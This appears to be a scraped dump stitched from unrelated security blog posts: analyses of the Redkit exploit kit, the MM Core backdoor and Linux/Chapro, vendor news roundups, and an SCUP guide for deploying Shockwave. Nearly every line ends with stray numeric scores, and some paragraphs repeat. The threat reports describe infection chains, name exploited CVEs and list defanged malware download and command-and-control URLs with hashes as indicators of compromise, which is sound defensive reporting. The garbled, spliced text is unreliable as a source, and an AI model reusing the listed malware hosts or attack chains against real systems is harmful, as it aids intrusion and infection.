Exploit Kit authors must really love Java . Not only is it ripe with vulnerabilities but its own language provides a great platform to write and deliver malware in different ways. We are used to seeing encrypted payloads (XOR, AES encryption), applets containing both the exploit itself and the binary payload. Today we will talk about yet another combination which we nicknamed the “split”.
The below screenshot shows the Redkit Exploit Kit in action:",0.01253741179511425
"Let’s dissect it step by step:
The landing page:",0.010672632731434706
"Very basic code that references the malicious Java applet and points to the Application class.
The Java exploit:",0.01060198928928946
"CVE-2013-0422 and CVE-2012-1723 were spotted within the jar file.
The (encrypted) payload:",0.01018803214383357
"What appears to be a singled encrypted file (setup.exe being a bogus name anyway) is not. Instead of having a single payload, we have two binaries:
C:\Documents and Settings\user\Local Settings\Temp\sjskstrk.exe
C:\Documents and Settings\user\Local Settings\Temp\deruaeru.exe",0.01059069945043245
"The first clue we got came from a file size discrepancy. Seeing an encrypted payload is not unique but usually the file size matches the dropped binary. The other clue was that we had two drops on disk but only one point of origin.
sjskstrk.exe: Size on disk 94,208 bytes
deruaeru.exe: Size on disk 45,056 bytes
28.html: Size on disk 139,264 bytes
A little math confirmed our suspicions:
94,208 + 45,056 = 139,264
The split happens within the jar file itself, in a class where we see the two (unobfuscated) strings that correspond to our file names:",0.0138531621424548
The bytes from each file are read and then split:,0.007769008271641509
The files are finally executed:,0.007686289452659811
"What do we know about the two malware files dropped by this exploit?
sjskstrk.exe is a Urausy, a particular type of Ransomware that asks for a $300 payment to unlock the computer. If the victim is in the US, the following screen will be shown:",0.013401646435256986
deruaeru.exe is a Karagny Trojan Downloader. This one will call the mother infrastructure for instructions:,0.012631636398646728
"It could deliver all sorts of payload (banking trojan, spambot, etc).
Both files are detected by Malwarebytes Anti-Malware:",0.017429792122022558
"Conclusion:
The malware author willingly chose to package the malicious jar with those two different payloads. Of course this could have be done using separate exploit pages but why bother when you could do it all in one go.
This approach also shows new possibilities to package malware in a way that could evade detection and bypass traffic signatures.
",0.010200018783401044
"SMB2 zero‑day
Some traffic has crossed my radar concerning a 0-day exploit that apparently enables a remote attacker to crash a Vista or Windows 7 system with SMB enabled (and according to subsequent reports, Server 2008). The original post and exploit are claimed to demonstrate the possibility of a Blue Screen Of Death (BSOD) and (normally) an automatic reboot when",0.011272515707820618
David Harley,0.00885109592441069
9 Sep 2009 - 04:47AM,0.012326221438812124
"Some traffic has crossed my radar concerning a 0-day exploit that apparently enables a remote attacker to crash a Vista or Windows 7 system with SMB enabled (and according to subsequent reports, Server 2008). The original post and exploit are claimed to demonstrate the possibility of a Blue Screen Of Death (BSOD) and (normally) an automatic reboot when",0.01163716633117684
"Some traffic has crossed my radar concerning a 0-day exploit that apparently enables a remote attacker to crash a Vista or Windows 7 system with SMB enabled (and according to subsequent reports, Server 2008). The original post and exploit are claimed to demonstrate the possibility of a Blue Screen Of Death (BSOD) and (normally) an automatic reboot when the SMB2 driver fails to handle malformed headers correctly.",0.013112433495839237
"However, subsequent traffic on a specialist mailing list indicates that the underlying vulnerability could also be used to effect remote code execution and local privilege escalation. SecurityFocus has subsequently reported this as a remote code execution vulnerability, and cites a CVE reference CVE-2009-3103, but this isn’t listed at CVE (Common Vulnerabilities and Exploits) at time of writing.",0.008281048438342209
"According to the Internet Storm Center, a Microsoft advisory has become available: “Microsoft Security Advisory (975497) Vulnerabilities in SMB Could Allow Remote Code Execution”, at www.microsoft.com/technet/security/advisory/975497.mspx: however, I’m just getting an error message on that URL right now. This vulnerability is not addressed by this month’s “Patch Tuesday” updates.",0.01060994372035795
"A preliminary analysis from the University of Minnesota passed onto a specialist list suggests that the exploit defaults to 445/tcp, and suggests some possible mitigations:",0.008538534899576566
"Set firewalls to deny inbound file and print sharing, or set network location to “public”
Disable SMB2 (I believe this is enabled by default – DH)",0.01191989658636361
"Brian Eckman, the analyst in question, notes that “..the steps taken for servers require a registry change and a reboot, while disabling the SMB2 client appears to only require a couple commands to be run.” So administrators on large sites  will need to warn end users and departments before applying mitigation on such machines.",0.010316208645096525
"Hopefully, the promised Microsoft advisory will become available shortly: I would expect this to include precise information on short-term workarounds.",0.012199983270650416
"David Harley
Director of Malware Intelligence
",0.009035364589518369
"Week in Security: Grief for gamers, Unicorn spotted – and America wakes up
Cybercriminals once again had gamers in their sights this week, with leaks of multiple account details and a new Steam scam - but there was good news in the form of upgraded security on Whatsapp, and dawning awareness on privacy.",0.014565652164091447
21 Nov 2014 - 09:07PM,0.011441676674794787
"Cybercriminals once again had gamers in their sights this week, with leaks of multiple account details and a new Steam scam – but there was good news in the form of upgraded security on Whatsapp, and dawning awareness on privacy.",0.014080705695994733
"Cybercriminals once again had gamers in their crosshairs this week – with one self-proclaimed hacking group dumping what appeared to be the first installment of logins purloined from gaming networks online, and Steam gamers falling victim to scams when trading in-game goods.",0.016566667427730497
"There was good news, though, in the form of upgraded security for WhatsApp, and a new awareness among the public that privacy is important.",0.01575840993085509
Login Leaks,0.00887875663277371
"Hacking group DerpTrolling has leaked 5,604 logins for three gaming networks to Pastebin, and claims that this is a “very small portion” of the credentials they have stolen, LifeHacker reports.",0.012735179691806708
"Derptrolling posted PSN, 2K Gaming and WIndows Live credentials with the words:”We will just leave this here.” A Pastebin link with over 5,500 login credentials followed. Not all of these appear to work – but the group promises it has more.",0.009813533497141314
"ESET security researcher Raphael Labaca Castro said, ‘“Even though there is not a large number of logins leaked, we encourage users to change their passwords for the Playstation Network, 2K Gaming Studio and Windows Live services.”",0.009464543169817818
Steam gamers were also targeted by a variation on a classic scam – where images of items supposedly for sale via the service’s Marketplace were shown off in a screensaver format. Victims who did not realise that a .scr file is effectively an executable PC file found that precious in-game items had vanished…,0.012511498336409965
Unicorn bug spotted in the wild?,0.011230735977974748
"Microsoft released a patch last week for a critical vulnerability allowing remote code execution in Internet Explorer. This vulnerability, known as Unicorn bug CVE-2014-6332, and discovered by an IBM X-Force security researcher, is significant because it exploits an old bug present in Internet Explorer versions 3 through 11. This means that most, if not all, Internet Explorer users are vulnerable unless they are using patched systems.",0.011376248553340407
"This week, ESET researchers spotted disturbing hints that the vulnerability may be used on a large scale by cybercriminals – after a compromised page on a news site exploited the bug.",0.012403823052240082
"ESET Research says,  “As you might have guessed, the compromised website was using CVE-2014-6332 to install malware on the computers of its unsuspecting visitors…”",0.006640343186825937
Privacy – is America waking up?,0.01435844121878982
"Two surveys, one conducted by Pew Internet, and one by Harris on behalf of ESET found that Americans were changing their habits online, in the wake of revelations about government groups and surveilllance online.",0.022120781174436388
"ESET’s Stephen Cobb writes, “While it’s not yet clear what changes, if any, politicians and government agencies will make in response to this very high level of concern about government surveillance, you can bet that some citizens are making changes.”",0.014976411718168658
“Consider social media. Pew found that ‘70% of social networking site users say that they are at least somewhat concerned about the government accessing some of the information they share on social networking sites without their knowledge.'”,0.016820834374990823
"ESET found that 47% of adult Americans who were aware of the Snowden/NSA revelations agreed with the following statement: “Given the news about the NSA, I have changed my approach to online activity in that I think more carefully about where I go, what I say, and what I do online.”
",0.017810514212264206
"Malicious Apache Module: a clarification
Apache modules are add-on code taking advantage of the Apache module API to extend the functionality of the standard Apache distro. In this case, the binary's functionality was malicious, but there is no exploitation of a known Apache vulnerability in this case.",0.008527667396992733
20 Dec 2012 - 05:49AM,0.011451410221981151
"Apache modules are add-on code taking advantage of the Apache module API to extend the functionality of the standard Apache distro. In this case, the binary’s functionality was malicious, but there is no exploitation of a known Apache vulnerability in this case.",0.008215549865770666
[Update: here’s a comment just added to his original blog by Pierre-Marc. As pointed out here it appears that what we call Linux/Chapro.A has already been publicly discussed here by UnmaskParasites.We were not aware of this material before publishing this blog.  Thank you Eric Romang for pointing this out.],0.01021081571959992
"The very classy recent blog from Pierre-Marc on ESET Canada’s recent work on Linux/Chapro.A has generated lots of interest and some questions, including some from the press. We wanted to clarifiy that, as far as we’re aware, no Apache vulnerability is currently associated with this malware or the other threats highlighted in the post, though the Sweet Orange exploit pack does attempt to exploit some known browser and plug-in vulnerabilities, as Pierre-Marc already noted:",0.011235455393871385
"CVE-2012-5076: Java JAX-WS Class Handling
CVE-2012-4681: Java getField Method Class Invocation Privilege Escalation
CVE-2006-0003: Internet Explorer MDAC
CVE-2010-0188: Adobe Reader LibTiff Integer Overflow",0.019468635250726507
"Our friends and colleagues at Kaspersky did, when they kindly flagged our article, use the term ‘Apache exploit’ but I suspect they were using it in the looser sense of exploiting the Apache mechanism for adding modules that aren’t part of the standard distribution, rather than implying a vulnerability in Apache code. Apache modules are add-on code taking advantage of the Apache module API to extend the functionality of the standard Apache distro. In this case, the binary’s functionality was malicious.",0.011437355818997075
"When we discussed this internally, ESET Canada’s Sébastien Duquette said:",0.01506463773844724
"We don’t know the specific way the module was loaded on the server from which we got the binary. The module was loaded in Apache via the standard method: in the instance we analyzed, the module was named “mod_chart_proxy” but it could be called anything. Users should keep an eye on the modules they have loaded in Apache and investigate modules they don’t recognize.",0.009547438932160035
"As far as I can tell, no module of that name has been registered with Apache’s modules database, and to the best of my knowledge Apache has not commented on the issue. There’s probably no reason why they should.",0.008784957346472333
Pierre-Marc commented:,0.01080415286932701
"“No idea how the chapro module got onto the server in the first place, could be weak password, vulnerable web application, etc. The user needs high privileges to load the module so.. he most probably had root on the machine.”",0.010388019376573854
"“We don’t know who is spreading this but probably a gang specializing in such attacks, then renting “traffic” to other groups, I assume in this case a group that uses sweet orange to install zbot.”",0.01813290424664915
Cameron Camp said:,0.007913644508152906
"It seems very unlikely that the module would have come from an official distro’s repositories, or the problems would be far more widespread. It is much more likely that the rogue code just got uploaded someplace on a server and apache is/was just doing what it was told.",0.010351187273128115
Stephen Cobb added:,0.008698098197178594
"However, we also need to consider the module could have been part of a corrupted Linux distribution or application package.",0.009321372562163921
"Here, once again, are the MD5 hashes for the code that ESET Canada analysed. However, it’s more than possible that the same or similar code will turn up again with a different hash.",0.011177613586360713
"Description
MD5 Hash",0.009545792232964256
"Linux/Chapro.A
e022de72cce8129bd5ac8a0675996318",0.008488209613309872
"Injected iframe
111e3e0bf96b6ebda0aeffdb444bcf8d",0.007689960572864196
"Java exploit
2bd88b0f267e5aa5ec00d1452a63d9dc",0.006276855522121538
"Zeus binary
3840a6506d9d5c2443687d1cf07e25d0",0.008131666347106825
"David Harley CITP FBCS CISSP
ESET Senior Research Fellow
",0.011179100245160778
"MM core in-memory backdoor returns as ""BigBoss"" and ""SillyGoose""",0.005881127662229035
"In October 2016 Forcepoint Security Labs™ discovered new versions of the MM Core backdoor being used in targeted attacks. Also known as “BaneChant”, MM Core is a file-less APT which is executed in memory by a downloader component.",0.0106066942418791
"Introduction
by Nicholas Griffin and Roland Dela Paz
In October 2016 Forcepoint Security Labs™ discovered new versions of the MM Core backdoor being used in targeted attacks. Also known as “BaneChant”, MM Core is a file-less APT which is executed in memory by a downloader component. It was first reported in 2013 under the version number “2.0-LNK” where it used the tag “BaneChant” in its command-and-control (C2) network request. A second version “2.1-LNK” with the network tag “StrangeLove” was discovered shortly after.
In this blog we will detail our discovery of the next two versions of MM Core, namely “BigBoss” (2.2-LNK) and “SillyGoose” (2.3-LNK). Attacks using ""BigBoss"" appear likely to have occurred since mid-2015, whereas ""SillyGoose"" appears to have been distributed since September 2016. Both versions still appear to be active.
Targeted Regions and Industries
In 2013 MM Core was reported to target Middle Eastern and Central Asian countries. Our own telemetry suggests that both Africa and the United States have also been recent targets. The following list shows the targeted industries we have observed:",0.016043011717451594
"News & Media
Government - Defence
Oil & Gas Manufacturing
Telecommunications",0.011170075855245987
"MM Core Capabilities
An overview of MM Core backdoor’s functionalities is as follows:",0.01097298918737799
"Send infected system’s computer name, windows version, system time, running processes, TCP/IP configuration, and top level directory listings for drives C to H
Download and execute file
Download and execute file in memory
Update itself
Uninstall itself",0.012292084022856087
"Infection Method
Previously the MM Core downloader component was downloaded and executed through shellcode by a DOC file exploiting CVE 2012-0158. However, the new DOC exploit we found exploits a more recent CVE-2015-1641 Microsoft Word vulnerability which it uses to extract embedded malware. The extracted malware is then executed by leveraging a DLL side-loading vulnerability.
The DOC file we analysed (SHA1 d336b8424a65f5c0b83328aa89089c2e4ddbcf72) was named “US pak track ii naval dialogues.doc”. This document exploits CVE-2015-1641 and executes shellcode which drops a legitimate Microsoft executable along with a trojanised DLL named “ChoiceGuard.dll”. The shellcode then executes the Microsoft executable, causing the malicious DLL to automatically be loaded into the file when it is run - hence the term ""side-loading"". The DLL downloads and executes the file-less MM Core backdoor in memory, which uses steganography to hide itself inside a JPEG file. The JPEG contains code to decrypt itself using the Shikata ga nai algorithm.",0.01064500864182083
"Once decrypted and executed in memory, the MM Core backdoor will extract and install an embedded downloader when it is first run and add it to Windows start-up for persistence. This downloader, which is similar to the first trojanised DLL, is then executed and will download the MM Core JPEG once again, executing it in memory like before. This time MM Core will conduct its backdoor routine which will send off system information and await further commands.
An overview of this infection process is as follows:",0.010960751857598705
"Valid Certificates
Some of the downloader components we found (i.e. ""ChoiceGuard.dll"") are signed with a valid authenticode certificate from Russian organisation ""Bor Port"":",0.011030745028796307
"We suspect that this may be a stolen certificate as it is very unlikely that a malware author would sign malware with their own organisation's certificate.
Updated Malware Artefacts
Newer versions of MM Core use updated version tags, mutexes, and filenames as compared with their 2013 counterparts. These are listed in the table below:",0.01095424426393854
"Evasion Tactics
The MM Core actors have made significant efforts to prevent security researchers from tracking their infrastructure. The first two versions of MM Core back in 2013 used spoofed registrant information in order to register the C2 domains, whereas the new campaigns use C2s registered using a registrant privacy protection service. This makes it more difficult to track the actors' infrastructure using WHOIS data.
The actors have also registered their domains on BigRock, a popular web hosting company, in order to blend in with the noise of legitimate sites that are hosted on the same infrastructure.
Forcepoint Protection Statement
Forcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:",0.017507520796530507
"Stage 5 (Dropper File) - The malware components are prevented from being downloaded and/or executed.
Stage 6 (Call Home) - Network traffic used by the downloaders and MM Core is identified and blocked.",0.014994777290124106
"Conclusion
MM Core is an active threat targeting multiple countries and high profile industries. It is interesting to note that even though MM Core’s version has incremented twice, the core backdoor code has remained almost the same apart from the new file and mutex names. Largely this is perhaps due to the file-less nature of its payload, which may also explain why the majority of the updates were in the delivery mechanism. At the same time this demonstrates that the attackers behind MM Core very well know what they are doing, updating the malware just enough to keep their operation under the radar after all these years.
On the other hand, while the volume of related MM Core samples remain low, we noticed that the MM Core downloader shares code, techniques and network infrastructure with a trojan called ""Gratem"", as well as sharing the same authenticode certificate for recent samples. Gratem is a more active downloader malware family which has been distributed since at least 2014. Ultimately this suggests that MM Core may be a part of a larger operation that is yet to be fully uncovered.
Indicators of Compromise
Documents",0.012398747661391152
d336b8424a65f5c0b83328aa89089c2e4ddbcf72 (US pak track ii naval dialogues.doc),0.0089804549316429
Dropper/Downloader Samples (SHA1),0.015705085627574333
"f94bada2e3ef2461f9f9b291aac8ffbf81bf46ab
ef59b4ffc8a92a5a49308ba98cb38949f74774f1
1cf86d87140f13bf88ede74654e01853bae2413c
415ad0a84fe7ae5b88a68b8c97d2d27de5b3aed2
e8bfa4ed85aac19ab2e77e2b6dfe77252288d89b
f94bada2e3ef2461f9f9b291aac8ffbf81bf46ab
83e7b2d6ea775c8eb1f6cfefb32df754609a8129
b931d3988eb37491506504990cae3081208e1a66
7031f4be6ced5241ae0dd4315d66a261f654dbd6
ab53485990ac503fb9c440ab469771fac661f3cc
b8e6f570e02d105df2d78698de12ae80d66c54a2
188776d098f61fa2c3b482b2ace202caee18b411
e0ed40ec0196543814b00fd0aac7218f23de5ec5
5498bb49083289dfc2557a7c205aed7f8b97b2a8
ce18064f675348dd327569bd50528286929bc37a
3a8b7ce642a5b4d1147de227249ecb6a89cbd2d3
21c1904477ceb8d4d26ac9306e844b4ba0af1b43
f89a81c51e67c0bd3fc738bf927cd7cc95b05ea6",0.026176135002959344
MM Core Unpacked DLL Samples (SHA1),0.015143706396678502
"13b25ba2b139b9f45e21697ae00cf1b452eeeff5
c58aac5567df7676c2b08e1235cd70daec3023e8
4372bb675827922280e8de87a78bf61a6a3e7e4d
08bfdefef8a1fb1ea6f292b1ed7d709fbbc2c602",0.014245959088075355
Related Gratem Samples (SHA1),0.019109320326397783
"673f315388d9c3e47adc280da1ff8b85a0893525
f7372222ec3e56d384e7ca2650eb39c0f420bc88",0.010096340892099542
Dropper/Downloader Payload Locations,0.009080366536605156
hxxp://davidjone[.]net/huan/normaldot.exe,0.008821646039746223
MM Core Payload Locations,0.008762389153917916
"hxxp://mockingbird.no-ip[.]org/plugins/xim/top.jpg
hxxp://presspublishing24[.]net/plugins/xim/top.jpg",0.012177597769342685
"hxxp://ichoose.zapto[.]org/plugins/cc/me.jpg
hxxp://presspublishing24[.]net/plugins/cc/me.jpg",0.011452073163948584
"hxxp://waterlily.ddns[.]net/plugins/slm/pogo.jpg
hxxp://presspublishing24[.]net/plugins/slm/pogo.jpg",0.011816856180891011
"hxxp://nayanew1.no-ip[.]org/plugins/xim/top.jpg
hxxp://davidjone[.]net/plugins/xim/top.jpg",0.012195795512320529
"hxxp://hawahawa123.no-ip[.]org/plugins/xim/logo.jpg
hxxp://davidjone[.]net/plugins/xim/logo.jpg",0.012721916729857341
MM Core C2s,0.007813476049894463
"hxxp://presspublishing24[.]net/plugins/cc/mik.php
hxxp://presspublishing24[.]net/plugins/slm/log.php
hxxp://presspublishing24[.]net/plugins/xim/trail.php",0.013589690425345746
Gratem Second Stage Payload Locations,0.009235901335270191
"hxxp://adnetwork33.redirectme[.]net/wp-content/themes/booswrap/layers.png
hxxp://network-resources[.]net/wp-content/themes/booswrap/layers.png",0.013126870662380274
hxxp://adworks.webhop[.]me/wp-content/themes/bmw/s6.png,0.010351376829839665
"hxxp://adrev22[.]ddns.net/network/superads/logo.dat
hxxp://davidjone[.]net/network/superads/logo.dat
",0.011544802151612132
Google Image Poisoning Leads to Exploit,0.008473863687762595
Google search results have traditionally been the target of black hat SEO campaigns. Websense® Security Labs™ has identified a new trend in which cyber criminals take advantage of Google Image search rankings to spread malware.,0.022818046562326555
"Websense Security Labs Threatseeker® network has detected that Google Image search returns poisoned pictures when searching on celebrity child ""Presley Walker"". We first found on Monday that all the image search results took users to a notorious exploit kit – Neosploit. Later, it changed to redirecting users to rogue AV sites. As we publish this blog, the search results are still poisoned and are leading to Neosploit again. Websense customers are protected from both types of attack by ACE, our Advanced Classification Engine.",0.011690658051078162
"The search results for ""Presley Walker"" through Google Image:",0.008961814795966694
"Let's take a look at the first attack case. When a user clicks the pictures on the top line, the user will be redirected to a Neosploit exploit page.",0.012616059841581206
Below is one of the redirection chains used by this exploit kit:,0.008777076368633119
"From the chain, we see the third URL is the malicious site holding the exploit code. We found that all the exploited sites are hosted on the same IP 66.235.180.91, and interestingly, they constructed it with the same path namedTF19, which looks like a pattern of this campaign. At last it will trigger appropriate vulnerabilities targeted by this exploit kit according to the user's operating system and browser. From the chain above we see it downloaded a PDF file that targeted three Adobe Reader vulnerabilities. This PDF file is heavily obfuscated and has a relatively low VirusTotaldetection.",0.008886510028675021
"The list of URLs hosted on the IP, as shown from our Threatseeker network:",0.00773791539937152
"Neosploit is a well-known exploit kit in the black market. The authors reportedly stopped supporting and updating the exploit kit due to financial problems, but variants of Neosploit have been updated frequently. The variants may contain MDAC (CVE-2006-0003), ActiveX (CVE-2008-2463, CVE-2008-1898), and three Adobe Reader (Collab.getIcon,Util.Printf, Collab.collectEmailInfo) vulnerabilities, among others.",0.009657012600838177
"The second case is one of the common tricks black hat SEO campaigns always use: luring users to download fake antivirus software called InstallInternetProtectionXXX.exe. From the VirusTotal scan result, only 20% of antivirus engines detected this malware.",0.014998007080978315
"The rogue AV page when using Firefox to surf the Web:
",0.008944227303950725
The Rotten Tomato Campaign: New SophosLabs research on APTs,0.010562703734465329
"Written by
John Zorabedian",0.00826774006182307
"October 30, 2014",0.008517602382646428
Network Partners Products & Services Threat Research Advanced persistent threats APT Gabor Szappanos malware PlugX Rotten Tomato Zbot,0.010753157519809764
"An advanced persistent threat (APT) malware campaign seen in August and September 2014 is the subject of new research by one of our threat analysts at SophosLabs.
Sophos is calling this malware campaign “Rotten Tomato,” in reference to the Tomato Garden campaign; and because some of the samples were rotten in the sense that they were not effectively executed.
In a new technical paper on the threat, Principal Threat Researcher Gabor Szappanos, of SophosLabs Hungary, writes an interesting dive into the world of the attackers, examining the malware used by cybercriminals in these attacks, and shows how several different groups used the same zero-day Microsoft Word exploit.",0.014868150023215065
"“There must have been a staff meeting, where the manager prompted that, in the next malware distribution campaign they should not only use the aging CVE-2012-0158 vulnerability, but the newer CVE-2014-1761 as well,” Gabor writes.
In Rotten Tomato, the groups somehow got hold of a document that exploited the vulnerability, left the exploiting document part and the shellcode intact, and only changed the appended encrypted executable at the end.
Gabor has followed the Plugx malware family for the past two years. By watching the evolution of malware samples over that period, Gabor has special insight into targeted attacks, and the attackers.
In a previous paper, in which Gabor asked “Are APTs the new normal?”, he wrote about how common malware groups copy APTs.
Now the Rotten Tomato campaign shows that APT authors are getting ideas from the common malware groups, Gabor says, as the narrow line between them is even harder to define.
Read Gabor’s research paper by clicking here: The Rotten Tomato Campaign.
About SophosLabs
SophosLabs is the global network of threat centers staffed by Sophos researchers and analysts. Keep up to date with our latest research and technical papers, expert opinion, and security advice at Naked Security.
Follow us on your favorite social media networks, chat with us in our forums, download our informative podcasts, or sign up for our RSS feeds.",0.014233816896910945
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"4
",0.008739321216238327
SCUPing Shockwave,0.008286229165367254
"Posted by Roger on 18 November 2010, 1:07 pm",0.012551806775953911
"At the risk of stepping on the Queen of SCUP’s toes, I’m going to write-up how I deployed Shockwave with System Center Updates Publisher (SCUP).  For the prologue on what SCUP and SCCM are see last weeks post on SCUPing Flash.
Shockwave is part of our standard config.   I’m not really sure why.   Is it actually used for anything besides basic online games.   Since pushing out a mass uninstall of Shockwave isn’t in the cards, we need to patch it since we deployed it.   Shockwave doesn’t have security updates as often as Flash but it is still necessary to keep on top of.    Since I switched to using SCUP for depoying most software updates, I’ve deployed Shockwave twice.
The following instructions assume that SCUP is installed and working.
Open the SCUP console.
1.  Right Click System Center Updates Publisher and select Create Update.
UPDATE INFORMATION
Update Title : Shockwave 11.5.9
Description: Generally I take this from the security bulletin.   I pasted:
Critical vulnerabilities have been identified in Adobe Shockwave Player 11.5.8.612 and earlier versions on the Windows and Macintosh operating systems. These vulnerabilities, including CVE-2010-3653, referenced in Security Advisory APSA10-04, could allow an attacker, who successfully exploits these vulnerabilities, to run malicious code on the affected system. Adobe recommends users of Adobe Shockwave Player 11.5.8.612 and earlier versions update to Adobe Shockwave Player 11.5.9.615.
Classification : Security Updates
Bulletin ID : APSB10-25
Vendor: Adobe Systems, Inc.
(if you’ve deployed any Adobe updates you’ll have this in a pull down list)
Product: Shockwave
(personally I put Shockwave 11 but having a product version in product number is not considered best practice)
EXTENDED PROPERTIES
Article ID: APSB10-25
CVE ID: CVE-2010-2581, CVE-2010-2582 (these are obtained from the Adobe security bulletin)
Severity: Critical (obtained from security bulletin, or your personal evaluation)
Support URL: http://get.adobe.com/shockwave
More Info URL:  http://www.adobe.com/support/security/bulletins/apsb10-25.html
Impact: Normal
Reboot Behavior: Never Reboots
Oddly enough, Jason Lewis recently wrote that this setting doesn’t actually tell SCCM what switches to use, it tells the admin what the expected patch behavior is.   That is surprising to me.   I expected “never reboots” to add a reallysuppress type of command line switch automatically.
PREREQUISITE RULES
Windows Version
Comparison – Greater Than or Equal To
Major Version = 5
Minor Version = 1
SP Major Version = 2
SP Minor Version = 0
Build Number = Blank
Product Type = Workstation
I’m doing this based on the system requirements for Shockwave.  Also I’m only deploying to workstations, not servers.
SELECT PACKAGE
Installer Type : Windows Installer  File (MSI)
Update Package Source / Download URL.   These should be identical.   You need to download the Shockwave MSI from Adobe and store it locally on a server.
Binary Language: english
Command Line : Blank
APPLICABILITY RULES
When you add a MSI to SCUP, the applicability rules automatically contain a single applicability rule of Product ID not installed.   This rule would install Shockwave on all computers.   We only care to upgrade Shockwave where needed rather than install on all computers.   This sort of limitation could be performed in a collection within SCCM.    I prefer to build the applicability here.
I’ve found that “file version less than” rules don’t always work by themselves.   You need to check for the file existing and the file less than.   If your environment has 64 bit computers that needs to be accounted for as well.   I tend to do file version checks rather than registry checks.    I think I get more accurate results.
The applicability rule we’re building is something like this:
(File Exists, Common Paths = Windows; Path = system32\adobe\Director\swdir.dll
AND
File Version; Common Paths = Windows; Path = system32\adobe\Director\swdir.dll; Less Than 11.5.9.615
)
OR
(
File Exists; Common Paths = Windows ; Path = SysWOW64\adobe\Director\swdir.dll
AND
File Version ; Common Paths = Windows ; Path = SysWOW64\adobe\Director\swdir.dll ; Less Than 11.5.9.615
))",0.016526943160087293
"It is a serious pain to get these parenthesis correct.   I believe the trick was selecting the entire row.
INSTALLED RULES
The default Product installed rule works.
After that its just like any other SCUP update.    Hit the publish button (publishes to WSUS).   Synchronise into SCCM.   Deploy
Download CAB file
This CAB file is provided as an example without warranty.   You’d need to import it into SCUP, add your own MSI and publish.
",0.011020333556180484
"A Week in Security (Apr 03 – Apr 09)
Last week, we touched on a Twitter spam that lures one to hack accounts, got personal with tech support scammers, witnessed another fake iPhone discount news, talked about an “advertisement downloader“, and brought to light a very odd spam.
Senior security researcher Jérôme Segura informed us that Adobe released a new patch for a 0-day vulnerability in Flash Player that was being exploited in the wild. One noted exploit kit (EK) that did this was Magnitude, which led to a Cerber ransomware infection.
Segura also posted a blog article on a distribution channel for the Neutrino EK that he spotted. These channels begin with malicious iframe injections, he said, and looking deeper revealed “an infrastructure set up to handle traffic from multiple geolocations, much like a Traffic Distribution System (TDS)”.
For the first PUP Friday post for April, we talked about SafeSoft Protector, a variant from the TechSnab family that misuses Privoxy, a legitimate, open source Web proxy software.
Notable news stories and security related happenings:",0.014258423615857718
"US Passport and Visa Database Open to Intrusion? “The Consular Consolidated Database (CCD), which contains over 290 million passport-related records, 184 million visa records, and 25 million records on US citizens living abroad, has been found to be vulnerable to cyber attack and possibly data tampering. The discovery was the result of an internal review of the US State Department’s cyber defenses performed several months ago and, according to a Department’s official, ‘visa-related gaps’ have already been fixed.” (Source: Help Net Security)
War on Multiple Fronts: A Holistic Approach to Cybersecurity. “Identifying the bad actors and the risks they present, however, can only go so far before becoming cost-prohibitive. Just as a healthy, well-maintained body is able to fend off all but the most pernicious viral and bacterial agents, so can an organization defend itself. The successful organization is one that adopts a holistic approach to managing cybersecurity threats on multiple fronts.” (Source: Legal Tech News)
Microsoft Account-hijacking Hole Closed 48 Hours After Bug Report. “British researcher Jack Whitton has reported a Microsoft account hijacking authentication bug that would have been another arrow in an attacker’s phishing quiver, save for the fact that Microsoft fixed it. Whitton quietly reported the flaw to Microsoft which pounced and took only two days to process and patch the flaw. The flaw meant attackers would have been able to set up phishing sites for Microsoft assets like Outlook and then capture tokens which could then be used through manipulated POST data to log into accounts.” (Source: The Register)
The Password In Your Eyes: Has Iris Identity Authentication Finally Arrived? “While the adoption of biometric technology is a new development, Antolino noted that ‘it’s not a particularly new technology,’ as it has been around for about 20 years. But the recent adaption of iris-based authentication solutions, he added, is due to a confluence of factors, starting with expiration of a key patent in 2006 that enabled many other players to enter the market.” (Source: Legal Tech News)
A Flaw in the Family of CISCO FirePower Firewall Devices Allows Malware to Bypass Detection Mechanism. “Cisco is releasing security updates to fix a critical vulnerability (CVE-2016-1345) that affects one of its newest products, the FirePower firewall. The flaw has been discovered by security researchers at Check Point Security. The vulnerability is related the improper input validation of fields in HTTP headers. The attacker can remotely exploit the flaw by sending a specifically crafted HTTP request to a vulnerable system.” (Source: Security Affairs)
Trojan Found in More Than 100 Android Apps on Google Play Store. “Researchers have uncovered a new strain of advertising spyware in more than 100 Android apps downloadable from the official Google Play Store. The research team at Russian security firm Doctor Web first added the Trojan, which they called Android.Spy.277.origin, to its virus database on April 1st, 2016.” (Source: Graham Cluley’s Blog)
Crypto Ransomware Targets Called by Name in Spear-phishing Blast. “For the past decade, spear phishing—the dark art of sending personalized e-mails designed to trick a specific person into divulging login credentials or clicking on malicious links—has largely been limited to espionage campaigns carried out by state-sponsored groups. That made sense. The resources it takes to research the names, addresses, and industries of large numbers of individuals was worth it when targeting a given organization that had blueprints or some other specific piece of data prized by the attacker. But why go through the trouble to spread crypto ransomware or banking Trojans to the masses when a single scam e-mail could do the trick?” (Source: Ars Technica)
Brave will Pay You to See Ads with Its Ad-blocking Browser. “Adblocking users want anonymity, privacy and security. Online content publishers, for their part, have been trying to squirm out from under ad blockers since they hit the scene. The Brave browser has a new idea: it’s going to line your pocket with Bitcoin in exchange for viewing ads.” (Source: Sophos’ Naked Security Blog)
Poll: People Don’t Mind Hacking to Fight Terrorism. “The Federal Bureau of Investigation’s solution to opening a locked iPhone used by a San Bernardino shooter reflects how public generally wants government policing to work, a new Morning Consult poll shows. Voters do, however, think law enforcement officials should tell manufacturers about any vulnerabilities they exploit during criminal investigations.” (Source: Morning Consult)
Emergency Adobe Flash Update Prepped as Hackers Actively Exploit Flaw. “Adobe has announced that it will be issuing an emergency security update for its widely-used Flash Player, after discovering hackers were actively exploiting a security hole to hijack control of computer systems. The one piece of good news is that if you have been doing a reasonably good job of keeping your systems updated then you may already be benefiting from a mitigation introduced in Flash Player 21.0.0.182 that, according to Adobe, ‘currently prevents exploitation of this vulnerability.'” (Source: Graham Cluley’s Blog)
PayPal Vulnerabilities could have Allowed Phishing Emails. “A German researcher reportedly netted $500 (£354) from PayPal’s bug bounty programme for a vulnerability that could have allowed an attacker to carry out phishing and other attacks. The bug also could have allowed session hijacking, persistent redirecting to external sources and persistent manipulation of affected or connected service module context, the advisory said.” (Source: SC Magazine)
